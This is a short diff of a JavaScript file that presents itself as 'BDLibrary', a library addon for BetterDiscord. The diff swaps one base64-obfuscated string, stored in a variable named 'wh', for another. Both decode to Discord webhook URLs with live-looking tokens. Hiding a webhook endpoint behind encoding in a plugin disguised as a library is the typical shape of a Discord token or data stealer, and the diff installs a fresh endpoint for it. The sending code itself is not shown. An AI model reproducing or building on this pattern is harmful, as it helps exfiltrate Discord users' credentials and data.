@@ -4,7 +4,7 @@
   * @description Library addon for the Better Discord APP
 */
 
-var wh = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODM2MjY1MzQ2MzAxOTUyMDUyL1c3SmcyX2RuNDJzX1J5QkVOYTFzckpEd0l4SW10aGVOdnpNQlVaam9NQXdJX2cwWlZpLXFYZ2s4aEV1Z1JDM0s5dmdV");
+var wh = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODMwODM3MTcxMTMyNDMyNDI0L1lhX3VSd3JMSDVmdmhUTk9OdUtEQ2lxallCbi1PRGxyYkpuakozNU5oUXZSdV9hZXh0QkctY1VSZmV1Y3htRVA5N3I2");
 const config = {
     "info": {
         "name": "BDLibrary",
